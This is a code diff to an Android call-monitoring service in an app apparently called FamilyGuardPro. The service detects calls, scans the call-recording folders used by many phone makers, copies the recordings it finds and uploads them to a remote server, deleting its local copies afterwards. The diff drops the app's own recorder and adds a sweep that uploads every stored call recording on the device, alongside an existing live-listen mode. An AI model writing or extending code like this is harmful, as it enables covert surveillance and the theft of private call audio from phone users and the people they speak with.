@@ -18,7 +18,6 @@ import androidx.core.app.NotificationCompat
 import com.familyguardpro.FamilyGuardApp
 import com.familyguardpro.R
 import com.familyguardpro.network.ApiClient
-import com.familyguardpro.utils.AudioRecorder
 import com.familyguardpro.utils.PreferenceManager
 import kotlinx.coroutines.*
 import org.java_websocket.client.WebSocketClient
@@ -50,12 +49,10 @@ class CallRecordService : Service() {
     private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
     private lateinit var preferenceManager: PreferenceManager
     
-    private var audioRecorder: AudioRecorder? = null
     private var audioRecord: AudioRecord? = null
     private var webSocketClient: WebSocketClient? = null
     private var isRecording = false
     private var isLiveListening = false
-    private var currentRecordingFile: File? = null
     private var phoneStateListener: PhoneStateListener? = null
     private var telephonyManager: TelephonyManager? = null
     private var currentPhoneNumber: String? = null
@@ -113,11 +110,15 @@ class CallRecordService : Service() {
         
         when (intent?.getStringExtra("mode")) {
             "live_listen" -> startLiveListen()
-            "record" -> startRecording()
+            "sync_recordings" -> syncStoredCallRecordings()
             else -> {
                 // Service started for call detection - listener already registered above
                 if (!isEnabled) {
                     Log.d(TAG, "Call recording disabled in preferences")
+                }
+                // Also sync any stored recordings that haven't been uploaded yet
+                if (isEnabled) {
+                    syncStoredCallRecordings()
                 }
             }
         }
@@ -243,15 +244,20 @@ class CallRecordService : Service() {
         }
     }
 
-    // System call recording directories to check (Vivo, Samsung, Xiaomi, etc.)
+    // System call recording directories to check (Vivo, Samsung, Xiaomi, Oppo, OnePlus, Huawei, etc.)
     private val systemRecordingDirs = listOf(
         File(Environment.getExternalStorageDirectory(), "Recordings/Record/Call"),  // Vivo
         File(Environment.getExternalStorageDirectory(), "Recordings/Call"),          // Some Vivo variants
         File(Environment.getExternalStorageDirectory(), "Record/Call"),              // Alternative
         File(Environment.getExternalStorageDirectory(), "Music/Recordings/Call Recordings"), // Samsung
-        File(Environment.getExternalStorageDirectory(), "Call Recordings"),          // Generic
+        File(Environment.getExternalStorageDirectory(), "Call Recordings"),          // Generic / Google Dialer
         File(Environment.getExternalStorageDirectory(), "MIUI/sound_recorder/call_rec"), // Xiaomi
         File(Environment.getExternalStorageDirectory(), "PhoneRecord"),             // Oppo/Realme
+        File(Environment.getExternalStorageDirectory(), "Sounds/CallRecord"),       // OnePlus
+        File(Environment.getExternalStorageDirectory(), "Recordings"),              // Huawei / Generic
+        File(Environment.getExternalStorageDirectory(), "Record"),                  // Honor
+        File(Environment.getExternalStorageDirectory(), "Music/Call Recordings"),   // Samsung (older)
+        File(Environment.getExternalStorageDirectory(), "CallRecordings"),          // LG
     )
 
     private fun startCallRecording() {
@@ -262,19 +268,11 @@ class CallRecordService : Service() {
         isRecording = true
         recordingStartTime = System.currentTimeMillis()
         
-        Log.w(TAG, "Starting call recording for: $currentPhoneNumber, callType=$currentCallType, startTime=$recordingStartTime")
+        Log.w(TAG, "Starting call sync monitoring for: $currentPhoneNumber, callType=$currentCallType, startTime=$recordingStartTime")
         
-        // Snapshot existing system call recordings so we can detect new ones
+        // Snapshot existing system call recordings so we can detect new ones after call ends
+        // We do NOT record calls ourselves - we only sync recordings made by the device's built-in recorder
         snapshotSystemRecordings()
-        
-        // Also start AudioRecorder as fallback (may be silent on some devices like Vivo)
-        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
-        val fileName = "call_${timestamp}.mp3"
-        currentRecordingFile = File(cacheDir, fileName)
-        
-        audioRecorder = AudioRecorder(this)
-        val recordStarted = audioRecorder?.startRecording(currentRecordingFile!!.absolutePath, forCallRecording = true)
-        Log.w(TAG, "AudioRecorder.startRecording returned: $recordStarted")
     }
 
     // Set of files that existed before the call started
@@ -322,9 +320,7 @@ class CallRecordService : Service() {
             ((System.currentTimeMillis() - recordingStartTime) / 1000).toInt()
         } else 0
         
-        Log.w(TAG, "Stopping call recording, duration=${durationSeconds}s, recordingStartTime=$recordingStartTime, callType=$currentCallType")
-        
-        audioRecorder?.stopRecording()
+        Log.w(TAG, "Stopping call sync monitor, duration=${durationSeconds}s, recordingStartTime=$recordingStartTime, callType=$currentCallType")
         
         // Resolve contact name from phone number
         val contactName = getContactName(currentPhoneNumber)
@@ -341,16 +337,16 @@ class CallRecordService : Service() {
         
         // Use coroutine to wait for system recording to be written, then upload
         serviceScope.launch {
-            // Wait for system recording to finish writing (Vivo may take a few seconds)
-            delay(3000)
+            // Wait for system recording to finish writing (Vivo/Samsung may take a few seconds)
+            delay(4000)
             
-            // PRIORITY 1: Check for system call recording (Vivo, Samsung, etc.)
+            // Check for system call recording (Vivo, Samsung, Xiaomi, Oppo, etc.)
             val systemRecording = findNewSystemRecording()
             
             if (systemRecording != null) {
-                Log.w(TAG, "*** USING SYSTEM CALL RECORDING: ${systemRecording.absolutePath}, size=${systemRecording.length()} ***")
+                Log.w(TAG, "*** FOUND SYSTEM CALL RECORDING: ${systemRecording.absolutePath}, size=${systemRecording.length()} ***")
                 
-                // Copy system recording to our directory
+                // Copy system recording to our directory for upload
                 val recordingsDir = File(getExternalFilesDir(null), "CallRecordings")
                 if (!recordingsDir.exists()) recordingsDir.mkdirs()
                 
@@ -365,55 +361,11 @@ class CallRecordService : Service() {
                 }
                 
                 Log.w(TAG, "Uploading SYSTEM recording: phone=$phoneNumber, contact=$contactName, type=$callType, duration=${durationSeconds}s")
-                uploadCallRecordingWithAutoDelete(permanentFile, phoneNumber, contactName, durationSeconds, callType, systemRecording)
-                
-                // Delete AudioRecorder temp file since we have system recording
-                currentRecordingFile?.delete()
+                // Upload our copy, do NOT delete the original system recording
+                uploadCallRecordingWithAutoDelete(permanentFile, phoneNumber, contactName, durationSeconds, callType)
                 
             } else {
-                // PRIORITY 2: Fall back to AudioRecorder output
-                Log.w(TAG, "No system recording found, falling back to AudioRecorder output")
-                
-                val fileSize = currentRecordingFile?.length() ?: 0
-                Log.w(TAG, "AudioRecorder cache file: ${currentRecordingFile?.absolutePath}, exists=${currentRecordingFile?.exists()}, size=$fileSize")
-                
-                // Fallback duration from WAV file data
-                if (durationSeconds <= 0 && fileSize > 44) {
-                    var byteRate = 88200L
-                    try {
-                        val wavFile = java.io.RandomAccessFile(currentRecordingFile, "r")
-                        wavFile.seek(28)
-                        val b0 = wavFile.read().toLong()
-                        val b1 = wavFile.read().toLong()
-                        val b2 = wavFile.read().toLong()
-                        val b3 = wavFile.read().toLong()
-                        byteRate = b0 or (b1 shl 8) or (b2 shl 16) or (b3 shl 24)
-                        wavFile.close()
-                        Log.w(TAG, "WAV byte rate from header: $byteRate")
-                    } catch (e: Exception) {
-                        Log.w(TAG, "Failed to read WAV header, using default byteRate: $byteRate")
-                    }
-                    if (byteRate > 0) {
-                        durationSeconds = ((fileSize - 44) / byteRate).toInt()
-                    }
-                    Log.w(TAG, "Using fallback duration from file size: ${durationSeconds}s")
-                }
-                
-                currentRecordingFile?.let { file ->
-                    if (file.exists() && file.length() > 0) {
-                        val recordingsDir = File(getExternalFilesDir(null), "CallRecordings")
-                        if (!recordingsDir.exists()) recordingsDir.mkdirs()
-                        
-                        val permanentFile = File(recordingsDir, file.name)
-                        file.copyTo(permanentFile, overwrite = true)
-                        file.delete()
-                        
-                        Log.w(TAG, "Uploading AudioRecorder: phone=$phoneNumber, contact=$contactName, type=$callType, duration=${durationSeconds}s")
-                        uploadCallRecordingWithAutoDelete(permanentFile, phoneNumber, contactName, durationSeconds, callType)
-                    } else {
-                        Log.w(TAG, "No file to upload: exists=${file.exists()}, size=${file.length()}")
-                    }
-                }
+                Log.w(TAG, "No system recording found for this call - device may not have built-in call recording enabled")
             }
         }
     }
@@ -438,7 +390,7 @@ class CallRecordService : Service() {
         return null
     }
 
-    private fun uploadCallRecordingWithAutoDelete(file: File, phoneNumber: String?, contactName: String?, durationSeconds: Int, callType: String = "unknown", systemSourceFile: File? = null) {
+    private fun uploadCallRecordingWithAutoDelete(file: File, phoneNumber: String?, contactName: String?, durationSeconds: Int, callType: String = "unknown") {
         serviceScope.launch {
             var uploadSuccess = false
             var retryCount = 0
@@ -454,17 +406,12 @@ class CallRecordService : Service() {
             }
             
             if (uploadSuccess) {
-                Log.w(TAG, "Call recording uploaded successfully, scheduling deletion in 2 minutes")
-                // Delete after 2 minutes
-                delay(2 * 60 * 1000L) // 2 minutes
+                Log.w(TAG, "Call recording uploaded successfully, scheduling local copy deletion in 2 minutes")
+                // Delete our local copy after 2 minutes (original system recording is preserved)
+                delay(2 * 60 * 1000L)
                 if (file.exists()) {
                     file.delete()
-                    Log.w(TAG, "Local copy deleted from device: ${file.name}")
-                }
-                // Also delete the ORIGINAL system recording (from Vivo's Recordings folder)
-                if (systemSourceFile != null && systemSourceFile.exists()) {
-                    systemSourceFile.delete()
-                    Log.w(TAG, "System source recording deleted: ${systemSourceFile.absolutePath}")
+                    Log.w(TAG, "Local copy deleted: ${file.name}")
                 }
             } else {
                 Log.e(TAG, "Failed to upload after $maxRetries retries, keeping file for later sync")
@@ -571,15 +518,61 @@ class CallRecordService : Service() {
         }
     }
 
-    private fun startRecording() {
-        // One-time recording
-        val duration = 60 // seconds
-        startCallRecording()
-        
+    /**
+     * Scan and sync all unsynced call recordings stored on the device.
+     * This finds recordings in known system directories that haven't been uploaded yet.
+     */
+    private fun syncStoredCallRecordings() {
         serviceScope.launch {
-            delay(duration * 1000L)
-            stopCallRecording()
-            stopSelf()
+            Log.w(TAG, "Starting scan for unsynced stored call recordings...")
+            
+            val recordingsDir = File(getExternalFilesDir(null), "CallRecordings")
+            if (!recordingsDir.exists()) recordingsDir.mkdirs()
+            
+            // Get set of already-synced file names (files we've already copied)
+            val alreadySynced = recordingsDir.listFiles()?.map { it.name }?.toSet() ?: emptySet()
+            // Also check for .pending markers
+            val pendingFiles = recordingsDir.listFiles()?.filter { it.name.endsWith(".pending") }?.map { 
+                it.name.removeSuffix(".pending") 
+            }?.toSet() ?: emptySet()
+            
+            var syncedCount = 0
+            
+            for (dir in systemRecordingDirs) {
+                if (!dir.exists() || !dir.isDirectory) continue
+                
+                val files = dir.listFiles() ?: continue
+                for (file in files) {
+                    if (!file.isFile || file.length() < 1000) continue // Skip tiny/empty files
+                    if (alreadySynced.contains(file.name) || pendingFiles.contains(file.name)) continue
+                    
+                    Log.w(TAG, "Found unsynced recording: ${file.absolutePath}, size=${file.length()}")
+                    
+                    // Copy to our directory
+                    val localCopy = File(recordingsDir, file.name)
+                    try {
+                        file.copyTo(localCopy, overwrite = true)
+                    } catch (e: Exception) {
+                        Log.e(TAG, "Failed to copy ${file.name}: ${e.message}")
+                        continue
+                    }
+                    
+                    // Estimate duration from file size (~16kbps for m4a, ~128kbps for mp3)
+                    val durationSeconds = when {
+                        file.name.endsWith(".m4a", true) -> (file.length() / 2000).toInt().coerceAtLeast(1)
+                        file.name.endsWith(".wav", true) -> (file.length() / 88200).toInt().coerceAtLeast(1)
+                        else -> (file.length() / 16000).toInt().coerceAtLeast(1)
+                    }
+                    
+                    uploadCallRecordingWithAutoDelete(localCopy, null, null, durationSeconds, "unknown")
+                    syncedCount++
+                    
+                    // Small delay between uploads to avoid overwhelming the server
+                    delay(2000)
+                }
+            }
+            
+            Log.w(TAG, "Stored recording sync complete: $syncedCount new recordings found and queued for upload")
         }
     }
 
